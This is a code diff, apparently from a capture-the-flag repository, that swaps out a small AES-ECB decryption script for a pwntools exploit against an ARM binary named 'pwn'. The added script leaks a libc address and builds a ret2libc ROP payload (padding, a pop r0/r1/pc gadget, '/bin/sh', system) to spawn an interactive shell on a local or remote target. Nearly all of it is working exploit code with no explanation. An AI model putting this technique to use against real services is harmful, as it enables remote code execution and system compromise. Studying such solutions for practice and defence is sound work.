@@ -1,18 +1,26 @@
-import base58
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
+from pwn import *
+TIMEOUT = 5
 
-def aes_decrypt(key: bytes, ciphertext: bytes) -> bytes:
-    cipher = AES.new(key, AES.MODE_ECB)
-    plaintext = cipher.decrypt(ciphertext)
-    return plaintext
+context(os="linux",arch="arm",log_level="debug")
+p = process(['qemu-arm', '-L', './', './pwn'])
+#p = remote("127.0.0.1",9999)
 
-if __name__ == '__main__':
 
-    key=[0x1CCD4928604D14F8,0x7143CE7C15426266]
-    aes_key=key[0].to_bytes(8,"little")+key[1].to_bytes(8,"little")
-    print(aes_key)
-    cipher_text="8CRFoGsg8eBPnbE53XMNNmCvBbQEaKZuFkVhoTweoVQLozxhHaXKm2oSvcsGxxPCuR"
-    cipher_text1=base58.b58decode(cipher_text)
-    plain_text=aes_decrypt(aes_key, cipher_text1).decode('utf-8', errors='ignore')
-    print(plain_text)
+elf = ELF("./pwn")
+libc=ELF("./libc.so.6")
+rop=ROP(elf)
+
+p.recvuntil(b"stream: ",timeout=TIMEOUT)
+leak=p.recvline(timeout=TIMEOUT)
+leak_addr=int(leak.strip(),16)
+libc.address=leak_addr-libc.symbols["_IO_2_1_stdout_"]
+#print(libc.address)
+system_addr = libc.symbols["system"]
+
+binsh_addr=next(libc.search(b"/bin/sh"))
+pop_r0_r1_pc = (0x843b8+ libc.address)
+
+payload=b"\0"*68+p32(pop_r0_r1_pc)+p32(binsh_addr)+p32(binsh_addr)+p32(system_addr)
+
+p.sendafter(b"message:",payload,timeout=TIMEOUT)
+p.interactive()
